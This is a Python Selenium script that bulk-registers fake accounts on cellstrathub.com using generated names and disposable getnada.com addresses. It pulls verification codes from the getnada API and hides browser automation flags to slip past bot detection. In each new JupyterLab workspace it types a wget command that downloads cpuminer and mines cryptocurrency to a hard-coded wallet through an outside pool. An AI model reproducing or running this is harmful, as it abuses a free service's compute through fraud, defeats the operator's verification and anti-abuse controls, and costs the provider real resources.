import requests,random,json,os, time,string, re
cwd = os.getcwd()
from bs4 import BeautifulSoup
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
from multiprocessing import Pool
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as EC
from faker import Faker
fake = Faker() 
# brave_path = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
driver_path= f"{cwd}\\chromedriver.exe"
firefox_options = webdriver.ChromeOptions()
firefox_options.add_argument('--no-sandbox')

firefox_options.headless = False
firefox_options.add_argument('--disable-setuid-sandbox')
firefox_options.add_argument('disable-infobars')

firefox_options.add_argument('--no-first-run')
firefox_options.add_argument('--disable-dev-shm-usage')
firefox_options.add_argument("--disable-infobars")
firefox_options.add_argument('--log-level=3')

firefox_options.add_argument('--disable-blink-features=AutomationControlled')
firefox_options.add_experimental_option("useAutomationExtension", False)
firefox_options.add_experimental_option("excludeSwitches",["enable-automation"])

firefox_options.add_argument('--disable-notifications')
from selenium.webdriver.common.action_chains import ActionChains
# firefox_options.binary_location = brave_path
random_angka = random.randint(100,999)
random_angka_dua = random.randint(10,99)
 
def xpath_el(el):
    element_all = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, el)))

    return browser.execute_script("arguments[0].click();", element_all)

def xpath_ex(el):
    element_all = wait(browser,0.3).until(EC.presence_of_element_located((By.XPATH, el)))
    browser.execute_script("arguments[0].scrollIntoView();", element_all)
    return browser.execute_script("arguments[0].click();", element_all)

def sign_up(k):
    global browser
    k = k
    additonal = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5))
    email = fake.first_name()+f"{k}"+fake.last_name()+additonal+"@getnada.com"
    password = "automation123"
    
    # firefox_options.add_experimental_option('w3c', False)
    #firefox_options.add_experimental_option("mobileEmulation", mobile_emulation)
    firefox_options.add_argument(f"user-agent=Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1")
    browser = webdriver.Chrome(options=firefox_options,executable_path=driver_path)
    browser.execute_script("document.body.style.zoom='zoom 90%'")
    browser.get('https://cellstrathub.com/sign-up')
    print(f"[+] [{email}] Trying to Creating New Account...!")
    
    name_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="name"]')))
    name_input.send_keys(fake.name())
    email_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="username"]')))
    email_input.send_keys(email)
    username_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="preferred_username"]')))
    username_input.send_keys(fake.first_name()+fake.last_name())
    password_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="password"]')))
    password_input.send_keys(password)
    xpath_el('//button[@type="submit"]')
    sleep(5)
    n = 1 
    print(f"[*] [{email}] Please wait!")
    
    while True:
       
        if n == 10:
            print(f"[*] [{email}] Verification Failed!")
            browser.quit()
            quit()
        URL = f'https://getnada.com/api/v1/inboxes/{email}'
        r = requests.get(URL).json()
        #getting the latest message
        
        try:
            global uid
            sleep(1)
            uid = r['msgs'][0]['uid']
        
            mes = requests.get(f'https://getnada.com/api/v1/messages/html/{uid}')
            mes1 = BeautifulSoup(mes.content,'html.parser')
            get_data = mes1.prettify()
            clear = re.search("verify your account is (\w+)", get_data)
            get_code = clear.group(1)
            get_code = get_code.strip()
            print(f"[*] [{email}] OTP: {get_code}")
            break
        except IndexError:

            n = n+1
    
    xpath_el('//span[text()="Ok"]/parent::button')
    code_input = wait(browser,40).until(EC.presence_of_element_located((By.XPATH, '//input[@name="code"]')))
    code_input.send_keys(get_code)
    xpath_el('//button[@type="submit"]')
    notify = wait(browser,40).until(EC.presence_of_element_located((By.XPATH, '//h2[@class="MuiTypography-root MuiTypography-h6"]'))).text
    print(f"[*] [{email}] {notify}")
    xpath_el('//span[text()="Ok"]/parent::button')
    sleep(2)
    try:
        xpath_el('//span[text()="Ok"]/parent::button')
    except:
        pass
    email_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="username"]')))
    email_input.send_keys(email)
    password_input = wait(browser,15).until(EC.presence_of_element_located((By.XPATH, '//input[@name="password"]')))
    password_input.send_keys(password)
    xpath_el('//button[@type="submit"]')
    sleep(10)
    browser.refresh()
    sleep(5)
    wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '//*[text()="Start Workspace"]/parent::button'))).click()
    
    print(f'[*] [{email}] Start Workspace')
    check_pending = wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '//*[text()="Pending"]'))).text
    print(f'[*] [{email}] {check_pending}')
    wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '//*[text()="Pending"]'))).text
    wait(browser,140).until(EC.element_to_be_clickable((By.XPATH,'//*[text()="Launch JupyterLab"]/parent::button'))).click()
    print(f'[*] [{email}] Launch JupyterLab')
    sleep(3)
    try:
        browser.switch_to.window(browser.window_handles[1])
    except:
        sleep(5)
        browser.switch_to.window(browser.window_handles[1])
    try:
        browser.switch_to.window(browser.window_handles[0])
        browser.close()
    except:
        pass
    try:
        browser.switch_to.window(browser.window_handles[0])
    except:
        pass

    wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '(//div[@title="Start a new terminal session"])[1]'))).click()
    
    print(f'[*] [{email}] Start a new terminal session')
    wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '//textarea[@aria-label="Terminal input"]'))).send_keys('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1q0y7me7tywl4s7svly4d8vk60y0fpjkq0pr7y23.RDPAZURENG1 -t2')
    print(f'[*] [{email}] Input Script')
    print(f'[*] [{email}] Script Running!')
    wait(browser,120).until(EC.presence_of_element_located((By.XPATH, '//textarea[@aria-label="Terminal input"]'))).send_keys(Keys.ENTER)
   
if __name__ == '__main__':
    global prefix
    global password
    print("[*] Automation Cellstrathub.com!")
     
    loop_input = 10
    with open('loop.txt','w') as f:
        f.write('')
    for i in range(1, loop_input+1):
        with open('loop.txt','a+') as f:
            f.write(f'{i}\n')
    file_list_akun = "loop.txt"
    myfile_akun = open(f"{cwd}/{file_list_akun}","r")
    akun = myfile_akun.read()
    list_accountsplit = akun.split()
    k = list_accountsplit
    start = time.time()
    with Pool(2) as p:  
        p.map(sign_up, k)
    end = time.time()
    print("[*] Time elapsed: ", end - start)
